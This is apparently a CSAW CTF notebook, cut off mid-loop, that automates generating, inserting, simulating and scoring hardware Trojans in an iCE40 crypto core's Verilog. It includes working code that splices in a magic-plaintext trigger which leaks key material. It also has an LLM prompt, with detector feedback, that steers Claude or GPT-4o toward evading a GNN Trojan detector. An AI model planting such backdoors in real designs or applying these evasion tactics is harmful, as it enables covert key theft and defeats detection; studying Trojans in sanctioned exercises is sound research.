# Agentic Trojan Feedback Pipeline — CSAW HW-Trojan Challenge

**Sanctioned CSAW CTF exercise.** Closed-loop, provider-agnostic pipeline that
*generates → inserts → verifies → scores → refines* a stealthy hardware Trojan for
the reverse-engineered iCE40 crypto accelerator (`submission/rtl/crypto_core.v`).

This notebook is the "one-click AI → sim" automation targeted by the rubric
(creative AI use + system automation). Every stage is runnable **without an API
key** except LLM generation itself, which falls back to a deterministic seed bank
so the full loop is always demonstrable.

```
            ┌──────────────┐   feedback (scorecard + sim diffs + AST diagnostics)
            │  LLM GENERATE│◄───────────────────────────────────────────┐
            │ (Anthropic / │                                             │
            │   OpenAI)    │                                             │
            └──────┬───────┘                                             │
                   │ candidate: {rtl, trigger_program, expected_outputs} │
                   ▼                                                     │
   ┌───────────────────────────┐   ┌─────────────────────────────────┐ │
   │ AST GATE  (pyslang)        │──►│ SCORER                          │─┘
   │  parse + elaborate + ports │   │  stealth  (oracle, 128 vectors) │
   └───────────────────────────┘   │  payload  (trigger program)     │
                                    │  specificity (false-trigger)    │
                                    │  footprint (yosys synth_ice40)  │
                                    └─────────────────────────────────┘
```

**Pipeline stages:** config → golden oracle → iverilog harness → yosys footprint →
pyslang AST/interface gate → scorer → structured inserter + reference Trojan →
provider-agnostic LLM generator → **feedback refine loop** → report/export.

## 0 · Google Colab setup — run this first

Fetches the project files and installs the runtime dependencies that stock Colab does not ship: the EDA tools (Icarus Verilog + Yosys) and the Python packages (`anthropic`, `openai`, `pyslang`, and the optional GNN stack).

On the lab container this cell is a no-op — the tools are already present, so nothing is cloned or installed.

> **Edit `REPO_URL` below** to point at your fork before running.
> `[![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/YOUR_USER/csaw/blob/main/submission/pipeline/trojan_feedback_pipeline.ipynb)`

In [ ]:
# === Google Colab setup — RUN FIRST =========================================
import os, sys, shutil, subprocess
from pathlib import Path

# --- edit these for your repo ------------------------------------------------
REPO_URL  = "https://github.com/rorksam/csaw.git"   # <-- CHANGE ME
BRANCH    = "main"
GIT_TOKEN = ""   # only needed for a PRIVATE repo; paste a GitHub PAT, else leave ""
LEAN_CLONE = False  # False = full repo; True = sparse clone (pull only files the notebook needs, ~50 MB)
# ----------------------------------------------------------------------------

IN_COLAB = "google.colab" in sys.modules

def _sh(cmd, check=True):
    print("$", cmd)
    return subprocess.run(cmd, shell=True, check=check)

if IN_COLAB:
    # 1) fetch project files
    dest = Path("/content/csaw")
    # paths the notebook + GNN scorer actually read (used only when LEAN_CLONE)
    NEEDED = ["/submission/rtl", "/submission/pipeline",
              "/TrojanGYM/hw2vec", "/TrojanGYM/dfg_tj_rtl.pkl",
              "/TrojanGYM/model_HT1", "/TrojanGYM/model_HT2",
              "/TrojanGYM/model_HT3", "/TrojanGYM/model_HT4"]
    if not (dest / "submission" / "rtl" / "crypto_core.v").exists():
        url = REPO_URL.replace("https://", f"https://{GIT_TOKEN}@") if GIT_TOKEN else REPO_URL
        if LEAN_CLONE:
            # blob:none + sparse -> only the NEEDED paths' blobs are downloaded
            _sh(f"git clone --depth 1 --filter=blob:none --sparse -b {BRANCH} {url} {dest}")
            _sh(f"git -C {dest} sparse-checkout set --no-cone " + " ".join(NEEDED))
        else:
            _sh(f"git clone --depth 1 -b {BRANCH} {url} {dest}")
    os.chdir(dest)
    os.environ["CSAW_ROOT"] = str(dest)

    # 2) EDA tools (iverilog/vvp + yosys) — provides synth_ice40 + sim
    if not (shutil.which("iverilog") and shutil.which("yosys")):
        _sh("apt-get -qq update", check=False)
        _sh("apt-get -qq install -y iverilog yosys")

    # 3) core Python deps
    _sh(f"{sys.executable} -m pip install -q anthropic openai pyslang")

    # 4) optional GNN stealth gate (TrojanGYM). Checkpoints REQUIRE tg==2.3.1.
    #    Best-effort: the pipeline degrades gracefully if this stack is absent.
    _sh("apt-get -qq install -y graphviz libgraphviz-dev", check=False)
    _sh(f"{sys.executable} -m pip install -q torch-geometric==2.3.1 pyverilog pydot pygraphviz", check=False)

print("setup complete | IN_COLAB =", IN_COLAB)
for t in ("iverilog", "vvp", "yosys"):
    print(f"  {t}: {shutil.which(t)}")

## 0b · API keys — paste yours in

The generator uses whichever key is present (**Anthropic preferred, else OpenAI**). Leave one blank to skip that provider; leave **both** blank to run the offline seed bank (no LLM calls). Keys live only in this runtime's environment — don't commit this cell with a key pasted in.

In [ ]:
# === API keys ===============================================================
# Paste a key between the quotes, then run this cell.
import os

os.environ["ANTHROPIC_API_KEY"] = ""   # sk-ant-...
os.environ["OPENAI_API_KEY"]    = ""   # sk-...

# Safer alternative — be prompted instead of pasting in cleartext:
# import getpass
# os.environ["ANTHROPIC_API_KEY"] = getpass.getpass("ANTHROPIC_API_KEY (blank to skip): ")
# os.environ["OPENAI_API_KEY"]    = getpass.getpass("OPENAI_API_KEY (blank to skip): ")

for _k in ("ANTHROPIC_API_KEY", "OPENAI_API_KEY"):
    if not os.environ.get(_k):
        os.environ.pop(_k, None)        # drop blanks so presence checks are accurate
present = [k for k in ("ANTHROPIC_API_KEY", "OPENAI_API_KEY") if os.environ.get(k)]
print("LLM keys present:", present or "none -> offline seed-bank mode")

## 1 · Configuration & environment

Discovers the EDA tools and LLM providers. API-key **presence** is detected but
values are never read or printed. `ENABLE_LLM=0` forces the offline seed-bank path
(used for CI / validation runs).

In [1]:
import os, sys, json, glob, shutil, subprocess, tempfile, textwrap, random, re, time
from pathlib import Path

def _resolve_root():
    """Find the project root on Colab (/content/csaw), the lab container, or cwd."""
    env = os.environ.get("CSAW_ROOT")
    cands = ([Path(env)] if env else []) + [
        Path.cwd(), Path("/content/csaw"), Path("/home/researcher/work/csaw")]
    for c in cands:
        if (c / "submission" / "rtl" / "crypto_core.v").exists():
            return c.resolve()
    raise FileNotFoundError(
        "csaw project root not found — run the Colab setup cell, or set CSAW_ROOT.")
ROOT     = _resolve_root()
RTL_DIR  = ROOT/"submission"/"rtl"
PIPE_DIR = ROOT/"submission"/"pipeline"
AI_DIR   = ROOT/"submission"/"ai"
OUT_DIR  = PIPE_DIR/"pipeline_out"; OUT_DIR.mkdir(exist_ok=True)

BASE_RTL  = (RTL_DIR/"crypto_core.v").read_text()
ROM_FILES = sorted(glob.glob(str(RTL_DIR/"rom_*.hex")))
assert ROM_FILES, "ROM hex files missing"

def find_tool(name):
    p = shutil.which(name)
    if p: return p
    cand = f"/opt/oss-cad-suite/bin/{name}"
    return cand if os.path.exists(cand) else None

IVERILOG, VVP, YOSYS = find_tool("iverilog"), find_tool("vvp"), find_tool("yosys")
assert IVERILOG and VVP and YOSYS, f"EDA tools missing: {IVERILOG=} {VVP=} {YOSYS=}"

# key *presence* only — never materialize the values
HAVE_ANTHROPIC = bool(os.environ.get("ANTHROPIC_API_KEY"))
HAVE_OPENAI    = bool(os.environ.get("OPENAI_API_KEY"))
ENABLE_LLM     = os.environ.get("TROJAN_ENABLE_LLM", "1") != "0"

# pipeline parameters
N_STEALTH_VECTORS = 128     # random enc/dec vectors checked against the oracle
MAX_ITERS         = 4       # refine iterations
RNG_SEED          = 0xC5A
ANTHROPIC_MODEL   = "claude-opus-4-8"
OPENAI_MODEL      = "gpt-4o"

print(f"iverilog={IVERILOG}\nvvp={VVP}\nyosys={YOSYS}")
print(f"ROMs: {len(ROM_FILES)} files")
print(f"keys present -> anthropic:{HAVE_ANTHROPIC} openai:{HAVE_OPENAI} | ENABLE_LLM:{ENABLE_LLM}")

iverilog=/usr/bin/iverilog
vvp=/usr/bin/vvp
yosys=/usr/local/bin/yosys
ROMs: 8 files
keys present -> anthropic:False openai:True | ENABLE_LLM:False


## 2 · Golden oracle (reference cipher, pure Python)

The recovered per-lane substitution tables (`cipher_tables.json`) give a
software reference for `E(P)`/`D(C)` with no RTL needed. Stealth is judged by
comparing a candidate's RTL output against this oracle.

In [2]:
_T = json.load(open(PIPE_DIR/"cipher_tables.json"))
ENC_TAB = {int(k): v for k, v in _T["enc"].items()}
DEC_TAB = {int(k): v for k, v in _T["dec"].items()}

def golden(word, mode):
    """mode 0=encrypt, 1=decrypt. 32-bit word -> 32-bit word."""
    tab = DEC_TAB if mode else ENC_TAB
    b = [(word >> (8*i)) & 0xff for i in range(4)]
    o = [tab[i][b[i]] for i in range(4)]
    return o[0] | (o[1] << 8) | (o[2] << 16) | (o[3] << 24)

assert golden(0x59C359C3, 0) == 0x9CD84392
assert golden(0x9CD84392, 1) == 0x59C359C3
print("golden oracle OK:  enc(0x59C359C3)=0x%08X   enc(0)=0x%08X" %
      (golden(0x59C359C3, 0), golden(0, 0)))

golden oracle OK:  enc(0x59C359C3)=0x9CD84392   enc(0)=0x08ABD043


## 3 · Simulation harness (Icarus Verilog)

A single command-driven testbench drives the SPI protocol. A *program* is a list
of `('R'|'E'|'D', word)` commands — reset / encrypt / decrypt — executed with
state preserved between ops (so multi-step / sequential Trojans work). The TB
prints one `OUT <hex>` per E/D op.

In [3]:
TB_PIPE = r"""`timescale 1ns/1ps
module tb;
  reg SCK=0,RST_N=1,MOSI=0,NORM_CS_N=1,START=0,ENC_DEC=0;
  wire MISO,BUSY,ICE_LED;
  crypto_core dut(.SCK(SCK),.RST_N(RST_N),.MOSI(MOSI),.MISO(MISO),
    .NORM_CS_N(NORM_CS_N),.START(START),.ENC_DEC(ENC_DEC),.BUSY(BUSY),.ICE_LED(ICE_LED));
  task pulse; begin SCK=1;#10;SCK=0;#10; end endtask
  task do_reset; begin RST_N=0; pulse; RST_N=1; pulse; end endtask
  task wr(input [31:0] w); integer i; begin
    NORM_CS_N=0; for(i=31;i>=0;i=i-1) begin MOSI=w[i]; pulse; end NORM_CS_N=1;
  end endtask
  task op(input e, input [31:0] p, output [31:0] c); integer i; begin
    ENC_DEC=e; wr(p); START=1; pulse; START=0; repeat(5) pulse;
    NORM_CS_N=0; c=0; for(i=31;i>=0;i=i-1) begin c[i]=MISO; pulse; end NORM_CS_N=1;
  end endtask
  integer fd,r; reg [16:1] cmd; reg [31:0] arg,c;
  initial begin
    fd=$fopen("prog.txt","r"); do_reset;
    while(!$feof(fd)) begin
      r=$fscanf(fd,"%s %h\n",cmd,arg);
      if(r>0) begin
        if(cmd=="R") do_reset;
        else if(cmd=="E") begin op(1'b0,arg,c); $display("OUT %08x",c); end
        else if(cmd=="D") begin op(1'b1,arg,c); $display("OUT %08x",c); end
      end
    end
    $finish;
  end
  initial begin #40000000 $finish; end
endmodule
"""

def run_program(rtl_text, program, timeout=180):
    """program: list of ('R'|'E'|'D', word). Returns dict with 'outs' (ints)."""
    with tempfile.TemporaryDirectory() as d:
        d = Path(d)
        (d/"dut.v").write_text(rtl_text)
        (d/"tb.v").write_text(TB_PIPE)
        for r in ROM_FILES:
            shutil.copy(r, d/os.path.basename(r))
        lines = []
        for op, w in program:
            lines.append("R 0" if op == "R" else f"{op} {int(w)&0xffffffff:08x}")
        (d/"prog.txt").write_text("\n".join(lines) + "\n")
        c = subprocess.run([IVERILOG, "-g2012", "-o", "sim.vvp", "tb.v", "dut.v"],
                           cwd=d, capture_output=True, text=True)
        if c.returncode != 0:
            return {"ok": False, "stage": "compile", "log": c.stderr + c.stdout, "outs": []}
        try:
            r = subprocess.run([VVP, "sim.vvp"], cwd=d, capture_output=True,
                               text=True, timeout=timeout)
        except subprocess.TimeoutExpired:
            return {"ok": False, "stage": "timeout", "log": "sim timeout", "outs": []}
        outs = [int(x, 16) for x in re.findall(r"OUT ([0-9a-fA-F]{8})", r.stdout)]
        return {"ok": True, "stage": "run", "log": r.stdout, "outs": outs}

# self-test on the base design
_t = run_program(BASE_RTL, [("R",0),("E",0x59C359C3),("D",0x9CD84392),("E",0)])
print("base harness OUT:", [f"{x:08x}" for x in _t["outs"]], "(expect 9cd84392 59c359c3 08abd043)")

base harness OUT: ['9cd84392', '59c359c3', '08abd043'] (expect 9cd84392 59c359c3 08abd043)


## 4 · Footprint metric (yosys `synth_ice40`)

Synthesizes to iCE40 primitives and counts cells. The Trojan's stealth includes a
small area delta vs the base design.

In [4]:
def footprint(rtl_text, timeout=300):
    with tempfile.TemporaryDirectory() as d:
        d = Path(d)
        (d/"dut.v").write_text(rtl_text)
        for r in ROM_FILES:
            shutil.copy(r, d/os.path.basename(r))
        # note: no -q (quiet mode suppresses the `stat` report table)
        c = subprocess.run([YOSYS, "-p", "read_verilog dut.v; synth_ice40; stat"],
                           cwd=d, capture_output=True, text=True, timeout=timeout)
        txt = c.stdout + c.stderr
        def grab(pat):
            m = re.search(r"(\d+)\s+" + pat, txt)
            return int(m.group(1)) if m else 0
        return {"lut": grab(r"SB_LUT4"), "dff": grab(r"SB_DFF\w*"),
                "ram": grab(r"SB_RAM40_4K"), "carry": grab(r"SB_CARRY"),
                "ok": c.returncode == 0, "log": txt}

BASE_FP = footprint(BASE_RTL)
print(f"BASE footprint: {BASE_FP['lut']} LUT4, {BASE_FP['dff']} DFF, "
      f"{BASE_FP['ram']} RAM40, {BASE_FP['carry']} CARRY")

BASE footprint: 141 LUT4, 68 DFF, 8 RAM40, 1 CARRY


## 5 · AST + interface gate (pyslang)

Before any simulation, each candidate must **parse and elaborate** cleanly
(`pyslang` AST front-end) and preserve the exact module name and port list of the
peripheral — the Trojan is not allowed to change the SPI interface. Elaboration
diagnostics feed back into the LLM on failure.

In [5]:
from pyslang.syntax import SyntaxTree
from pyslang.ast import Compilation

def _top_ports(rtl):
    t = SyntaxTree.fromText(rtl)
    c = Compilation(); c.addSyntaxTree(t)
    insts = list(c.getRoot().topInstances)
    if not insts:
        return None, None, c
    inst = insts[0]
    return inst.name, [p.name for p in inst.body.portList], c

BASE_NAME, BASE_PORTS, _ = _top_ports(BASE_RTL)
print("base interface:", BASE_NAME, BASE_PORTS)

def ast_gate(rtl):
    try:
        name, ports, comp = _top_ports(rtl)
    except Exception as e:
        return {"elaborates": False, "errors": [f"parse exception: {e}"],
                "module": None, "ports": None, "interface_ok": False}
    diags = comp.getAllDiagnostics()
    errs = [str(d.code) for d in diags if d.isError()] if diags else []
    iface_ok = (name == BASE_NAME) and (ports == BASE_PORTS)
    return {"elaborates": len(errs) == 0, "errors": errs,
            "module": name, "ports": ports, "interface_ok": iface_ok}

# self-test: base passes, broken RTL rejected
print("base gate :", {k: ast_gate(BASE_RTL)[k] for k in ("elaborates","interface_ok")})
print("broken    :", {k: ast_gate("module crypto_core(); wire x = ; endmodule")[k]
                      for k in ("elaborates","interface_ok")})

base interface: crypto_core ['SCK', 'RST_N', 'MOSI', 'MISO', 'NORM_CS_N', 'START', 'ENC_DEC', 'BUSY', 'ICE_LED']
base gate : {'elaborates': True, 'interface_ok': True}
broken    : {'elaborates': False, 'interface_ok': False}


## 5b · GNN stealth gate (TrojanGYM detector)

A second, *learned* stealth gate layered on top of the oracle check. The four
TrojanGYM **Robust-GNN4TJ** checkpoints (`model_HT1…4`) convert each candidate's RTL
to a dataflow graph (local `hw2vec`) and vote clean / trojan. A candidate **evades**
when no model votes trojan *and* the maximum `P(trojan)` stays under `GNN_MARGIN`
(default 0.30). Evasion contributes `GNN_WEIGHT` (default 0.15) of the final score;
any trojan vote marks the candidate `detected`.

The gate is **optional and graceful**: if the GNN stack (`torch-geometric==2.3.1`,
`pyverilog`, `pygraphviz`) or the checkpoints are absent, `gnn_detect` reports
`available: False` and scoring falls back to the original rubric unchanged, so the
notebook still runs end-to-end without the detector installed.

> Fidelity note: exact PyVerilog DFG extraction fails on `crypto_core`
> (`` `default_nettype none ``), so `hw2vec` uses its heuristic DFG — the same path
> TrojanGYM uses for AES. A CLEAN verdict is a useful stealth signal for this design
> family, not a proof of undetectability.

In [ ]:
# GNN stealth gate — TrojanGYM Robust-GNN4TJ ensemble (optional, degrades gracefully).
# Config (env-overridable):
GNN_ENABLE = os.environ.get("TROJAN_ENABLE_GNN", "1") != "0"
GNN_MARGIN = float(os.environ.get("TROJAN_GNN_MARGIN", "0.30"))   # max allowed P(trojan)
GNN_WEIGHT = float(os.environ.get("TROJAN_GNN_WEIGHT", "0.15"))   # share of score from evasion
TJGYM_HOME = Path(os.environ.get("TJGYM_HOME", ROOT/"TrojanGYM"))

sys.path.insert(0, str(PIPE_DIR))       # trojangym_scorer.py lives next to this notebook
_GNN = {"mod": None, "status": None}

def _gnn_module():
    """Lazy-load the detector once; on any failure, remember the reason and give up."""
    if _GNN["mod"] is None and _GNN["status"] is None:
        try:
            import trojangym_scorer as _m
            _m.get_detector(TJGYM_HOME)          # eager model load -> fail fast if deps/assets absent
            _GNN["mod"], _GNN["status"] = _m, "ready"
        except Exception as e:
            _GNN["status"] = f"unavailable: {e}"
            print("[GNN] detector unavailable — scoring continues without it:\n   ", _GNN["status"])
    return _GNN["mod"]

def gnn_detect(rtl, name="cand"):
    """Return the ensemble report dict, or {'available': False, 'reason': ...}."""
    if not GNN_ENABLE:
        return {"available": False, "reason": "disabled (TROJAN_ENABLE_GNN=0)"}
    mod = _gnn_module()
    if mod is None:
        return {"available": False, "reason": _GNN["status"]}
    try:
        return mod.score_rtl_text(rtl, home=TJGYM_HOME, name=name)
    except Exception as e:
        return {"available": False, "reason": f"detect failed: {e}"}

# self-test: the clean base core should read CLEAN (0 votes)
if GNN_ENABLE:
    _g = gnn_detect(BASE_RTL, "BASE")
    if _g.get("available"):
        print(f"[GNN] base crypto_core -> {_g['verdict']}  votes={_g['trojan_votes']}/{_g['model_count']}"
              f"  max_P(trojan)={_g['max_prob_trojan']:.3f}  (evasion margin {GNN_MARGIN})")
    else:
        print("[GNN] not active:", _g.get("reason"))
else:
    print("[GNN] disabled via TROJAN_ENABLE_GNN=0")

## 6 · Scorer

Combines every check into one scorecard. Hard gates (AST, interface, compile,
functional doc-vectors) zero the score. The weighted **base** score rewards:

| component | weight | meaning |
|---|---|---|
| stealth | 40 | fraction of 128 random vectors matching the oracle |
| payload | 30 | trigger program deviates **and** matches the claimed leak |
| specificity | 15 | `1 − false-trigger rate` on random traffic |
| footprint | 15 | small area delta (LUT/DFF) vs base |

When the **GNN detector gate** (§5b) is live, the final score is
`(1 − GNN_WEIGHT)·base + GNN_WEIGHT·100·margin`, where `margin` grows as
`max P(trojan)` drops below `GNN_MARGIN`. Any trojan vote forces `verdict =
"detected"`; a fully-passing, evading candidate is `"ok"`. If the detector is not
installed, the score is exactly the base rubric (the `GNN_WEIGHT` term vanishes).

In [ ]:
def score_candidate(rtl, trigger_program, expected_outputs, name="cand"):
    sc = {"name": name}
    # gate 1: AST parse/elaborate + interface preservation
    g = ast_gate(rtl); sc["ast"] = g
    if not g["elaborates"] or not g["interface_ok"]:
        sc.update(score=0.0, verdict="rejected:ast"); return sc
    # gate 2: compile + functional doc vectors
    doc = run_program(rtl, [("R",0),("E",0x59C359C3),("D",0x9CD84392)])
    if not doc["ok"]:
        sc.update(score=0.0, verdict="rejected:compile", log=doc["log"][:800]); return sc
    func_ok = doc["outs"] == [0x9CD84392, 0x59C359C3]
    sc["functional_ok"] = func_ok
    # stealth: random vectors vs oracle (no trigger present)
    rng = random.Random(RNG_SEED)
    prog, exp = [("R",0)], []
    for _ in range(N_STEALTH_VECTORS):
        w = rng.randrange(1 << 32); m = rng.randint(0, 1)
        prog.append(("D" if m else "E", w)); exp.append(golden(w, m))
    res = run_program(rtl, prog); outs = res["outs"]
    if len(outs) != len(exp):
        sc.update(score=0.0, verdict="rejected:sim", log=res["log"][:800]); return sc
    mism = [i for i,(a,b) in enumerate(zip(outs,exp)) if a != b]
    sc["stealth_rate"] = (len(exp)-len(mism))/len(exp)
    sc["false_trigger_rate"] = len(mism)/len(exp)
    # payload: run trigger program, compare to oracle & to claim
    tp = [(o, int(w,16) if isinstance(w,str) else w) for o,w in trigger_program]
    tr = run_program(rtl, tp); trig = tr["outs"]
    oracle_trig = [golden(w, 0 if o=="E" else 1) for o,w in tp if o in ("E","D")]
    deviates = any(a != b for a,b in zip(trig, oracle_trig))
    if expected_outputs is None:
        claim_ok = True
    else:
        exp_ints = [int(x,16) if isinstance(x,str) else x for x in expected_outputs]
        claim_ok = trig == exp_ints
    payload_ok = bool(deviates and claim_ok)
    sc["trigger_outputs"]  = [f"{x:08x}" for x in trig]
    sc["oracle_on_trigger"]= [f"{x:08x}" for x in oracle_trig]
    sc["payload_ok"] = payload_ok
    # footprint
    fp = footprint(rtl); sc["footprint"] = {k: fp[k] for k in ("lut","dff","ram","carry","ok")}
    sc["lut_delta"] = fp["lut"] - BASE_FP["lut"]
    sc["dff_delta"] = fp["dff"] - BASE_FP["dff"]
    # gate 3 (soft): GNN detector evasion — optional, folded into the score if available
    gnn = gnn_detect(rtl, name); sc["gnn"] = gnn
    # aggregate: original 0-100 rubric ...
    size_pen = max(0.0, 1 - (max(0,sc["lut_delta"]) + 2*max(0,sc["dff_delta"]))/60.0)
    base100 = 40*sc["stealth_rate"] + 30*payload_ok + 15*(1-sc["false_trigger_rate"]) + 15*size_pen
    # ... reweighted so detector evasion is worth GNN_WEIGHT when the detector is live
    if gnn.get("available"):
        margin = max(0.0, min(1.0, (GNN_MARGIN - gnn["max_prob_trojan"]) / GNN_MARGIN))
        sc["gnn_margin_score"] = round(margin, 3)
        sc["evades_detector"] = bool(gnn["trojan_votes"] == 0 and gnn["max_prob_trojan"] < GNN_MARGIN)
        s = (1 - GNN_WEIGHT)*base100 + GNN_WEIGHT*100*margin
    else:
        sc["evades_detector"] = None            # detector not run -> no effect on score
        s = base100
    if not func_ok: s = 0.0
    sc["score"] = round(s, 2)
    # verdict: a model vote is a hard "detected"; evasion required for "ok" when live
    if gnn.get("available") and gnn["trojan_votes"] > 0:
        sc["verdict"] = "detected"
    elif func_ok and sc["stealth_rate"] == 1.0 and payload_ok and sc["evades_detector"] in (True, None):
        sc["verdict"] = "ok"
    else:
        sc["verdict"] = "weak"
    return sc

# self-test on the clean base: stealth perfect, no payload
_b = score_candidate(BASE_RTL, [("E", 0xDEADBEEF)], None, "BASE")
print("BASE scorecard:", {k:_b.get(k) for k in
      ("functional_ok","stealth_rate","payload_ok","lut_delta",
       "evades_detector","score","verdict")})

## 7 · Structured inserter + reference Trojan

`structured_insert` splices a trigger-detect + payload mux at well-known anchors in
the base RTL (the `cipher_out` assignment and the result load). This is the
deterministic *structured-wrapping* path and the offline seed generator; the LLM
path (next section) produces whole-module variants validated by the **same** gate
and scorer. The reference Trojan below is used to self-test the scorer end-to-end.

- **Trigger:** a magic plaintext word presented to an *encrypt* op (never produced
  by normal traffic; false-trigger probability ≈ 2⁻³²).
- **Payload:** that op returns a constant leak word on MISO instead of ciphertext —
  here the recovered key-material candidate — while all other traffic is untouched.

In [7]:
def structured_insert(base_rtl, magic=0xDEADBEEF, leak=0x8E043CB0):
    """Anchor-based (AST-located) Trojan splice. Returns a full crypto_core variant."""
    anchor = "wire [31:0] cipher_out = {c3, c2, c1, c0};"
    assert anchor in base_rtl, "cipher_out anchor not found"
    inject = (anchor +
        f"\n    localparam [31:0] TROJ_MAGIC = 32'h{magic:08X}, TROJ_LEAK = 32'h{leak:08X};"
        "\n    wire troj_hit = (operand == TROJ_MAGIC) && (mode == 1'b0);"
        "\n    wire [31:0] result_out = troj_hit ? TROJ_LEAK : cipher_out;")
    out = base_rtl.replace(anchor, inject)
    out = out.replace("shift_reg <= cipher_out;", "shift_reg <= result_out;")
    return out

REFERENCE_TROJAN = structured_insert(BASE_RTL, 0xDEADBEEF, 0x8E043CB0)
ref_sc = score_candidate(REFERENCE_TROJAN, [("E","deadbeef")], ["8e043cb0"], "reference-key-leak")
print(json.dumps({k: ref_sc.get(k) for k in
      ("functional_ok","stealth_rate","payload_ok","false_trigger_rate",
       "lut_delta","dff_delta","score","verdict")}, indent=2))

{
  "functional_ok": true,
  "stealth_rate": 1.0,
  "payload_ok": true,
  "false_trigger_rate": 0.0,
  "lut_delta": 11,
  "dff_delta": 0,
  "score": 97.25,
  "verdict": "ok"
}


## 8 · Provider-agnostic LLM generator

One interface over **Anthropic** and **OpenAI**; whichever key is present is used.
The model receives the base RTL, the hard interface rules, the scoring rubric, and
(on later iterations) the previous scorecards as feedback. It must return a single
JSON object describing the Trojan and a complete `crypto_core` module.

In [ ]:
CANDIDATE_SCHEMA = {
  "name": "short-id",
  "trigger_description": "how it is activated, in terms of SPI ops / plaintext",
  "payload_description": "what it leaks/corrupts and where it is observed",
  "stealth_notes": "why normal traffic is unaffected",
  "rtl": "<FULL crypto_core module, SAME ports, keeping the $readmemh rom_*.hex lines>",
  "trigger_program": [["E","deadbeef"]],
  "expected_outputs": ["8e043cb0"]
}

SYSTEM_PROMPT = textwrap.dedent("""\
    You are a hardware-security researcher building a stealthy hardware Trojan for a
    SANCTIONED CSAW capture-the-flag exercise (defensive research; all artifacts stay
    in simulation). You modify a reverse-engineered iCE40 SPI crypto peripheral.

    HARD RULES (a violation scores zero):
    - Keep the module name `crypto_core` and its exact port list unchanged.
    - Keep the eight `$readmemh("rom_*.hex", ...)` S-box loads intact.
    - Normal (non-trigger) encrypt/decrypt MUST remain bit-exact to the original.
    - The Trojan must be small (few LUTs), with a specific trigger (negligible
      false-trigger rate) and a precise, observable payload on MISO.

    DETECTOR AWARENESS (feeds the score):
    - A GNN trojan detector (TrojanGYM / GNN4TJ) also scores your RTL. Each attempt's
      feedback includes `gnn_trojan_votes`, `gnn_max_prob_trojan`, and `evades_detector`.
    - Aim for zero votes and a low `gnn_max_prob_trojan`. Reduce structural red flags:
      prefer reusing existing datapath signals over adding wide equality comparators on
      literal constants, avoid extra always-blocks / counters, and keep naming ordinary.

    Respond with ONE fenced ```json block matching the given schema and nothing else.""")

def build_user_prompt(history):
    fb = ""
    if history:
        fb = "\n\nPREVIOUS ATTEMPTS (refine — fix every weakness, incl. detector evasion):\n" + json.dumps(history[-3:], indent=2)
    return (f"BASE RTL to modify:\n```verilog\n{BASE_RTL}\n```\n\n"
            f"Required JSON schema:\n```json\n{json.dumps(CANDIDATE_SCHEMA, indent=2)}\n```"
            f"{fb}\n\nProduce the next, improved Trojan candidate.")

class LLMClient:
    def __init__(self):
        self.provider = None
        if HAVE_ANTHROPIC:
            import anthropic; self.cli = anthropic.Anthropic(); self.provider = "anthropic"
        elif HAVE_OPENAI:
            import openai; self.cli = openai.OpenAI(); self.provider = "openai"
    def available(self): return self.provider is not None
    def complete(self, system, user, max_tokens=6000):
        if self.provider == "anthropic":
            m = self.cli.messages.create(model=ANTHROPIC_MODEL, max_tokens=max_tokens,
                    system=system, messages=[{"role":"user","content":user}])
            return "".join(b.text for b in m.content if getattr(b,"type","")=="text")
        if self.provider == "openai":
            r = self.cli.chat.completions.create(model=OPENAI_MODEL,
                    messages=[{"role":"system","content":system},{"role":"user","content":user}])
            return r.choices[0].message.content
        raise RuntimeError("no LLM provider available")

def parse_candidate(text):
    m = re.search(r"```json\s*(\{.*?\})\s*```", text, re.S) or re.search(r"(\{.*\})", text, re.S)
    if not m: raise ValueError("no JSON object in LLM response")
    return json.loads(m.group(1))

print("LLM generator ready (provider resolved at loop start).")

## 9 · Feedback refine loop

`generate → AST gate → score → feed results back → regenerate`, keeping the best
candidate. With a provider key it drives the LLM; otherwise it replays a seed bank
so the loop, scoring, and selection are always exercised.

In [ ]:
# offline seed bank (structured-insert variants) — used when no LLM key / ENABLE_LLM=0
OFFLINE_SEEDS = [
    {"name":"seed-key-leak", "rtl": structured_insert(BASE_RTL, 0xDEADBEEF, 0x8E043CB0),
     "trigger_program":[["E","deadbeef"]], "expected_outputs":["8e043cb0"],
     "trigger_description":"magic plaintext 0xDEADBEEF on encrypt",
     "payload_description":"leaks key-material candidate 0x8E043CB0 on MISO"},
    {"name":"seed-alt-magic", "rtl": structured_insert(BASE_RTL, 0x0BADF00D, 0xB03C048E),
     "trigger_program":[["E","0badf00d"]], "expected_outputs":["b03c048e"],
     "trigger_description":"magic plaintext 0x0BADF00D on encrypt",
     "payload_description":"leaks reordered key bytes 0xB03C048E on MISO"},
]

def feedback_loop(max_iters=MAX_ITERS):
    client = LLMClient() if ENABLE_LLM else None
    use_llm = bool(ENABLE_LLM and client and client.available())
    print("generation mode:", client.provider if use_llm else "OFFLINE seed bank")
    history, results = [], []
    for it in range(max_iters):
        if use_llm:
            try:
                raw = client.complete(SYSTEM_PROMPT, build_user_prompt(history))
                (OUT_DIR/f"llm_response_{it}.txt").write_text(raw)
                cand = parse_candidate(raw)
            except Exception as e:
                print(f"iter {it}: generation/parse failed: {e}")
                history.append({"iter":it, "error":str(e)}); continue
        else:
            if it >= len(OFFLINE_SEEDS): break
            cand = OFFLINE_SEEDS[it]
        sc = score_candidate(cand["rtl"], [tuple(x) for x in cand["trigger_program"]],
                             cand.get("expected_outputs"), cand.get("name", f"cand{it}"))
        sc["candidate"] = cand; results.append(sc)
        _gnn = sc.get("gnn", {})
        _gp = _gnn.get("max_prob_trojan")
        print(f"iter {it}: {sc['name']:<18} score={sc['score']:<6} verdict={sc['verdict']:<10} "
              f"stealth={sc.get('stealth_rate')} payload={sc.get('payload_ok')} "
              f"lutD={sc.get('lut_delta')} dffD={sc.get('dff_delta')} "
              f"gnnP={('%.3f'%_gp) if _gp is not None else 'n/a'} evade={sc.get('evades_detector')}")
        history.append({"iter":it, "name":sc.get("name"), "score":sc["score"],
                        "verdict":sc["verdict"], "functional_ok":sc.get("functional_ok"),
                        "stealth_rate":sc.get("stealth_rate"), "payload_ok":sc.get("payload_ok"),
                        "false_trigger_rate":sc.get("false_trigger_rate"),
                        "lut_delta":sc.get("lut_delta"),
                        # detector feedback so the LLM can steer toward evasion
                        "gnn_trojan_votes":_gnn.get("trojan_votes"),
                        "gnn_max_prob_trojan":_gnn.get("max_prob_trojan"),
                        "evades_detector":sc.get("evades_detector"),
                        "ast_errors":sc.get("ast",{}).get("errors"),
                        "trigger_outputs":sc.get("trigger_outputs"),
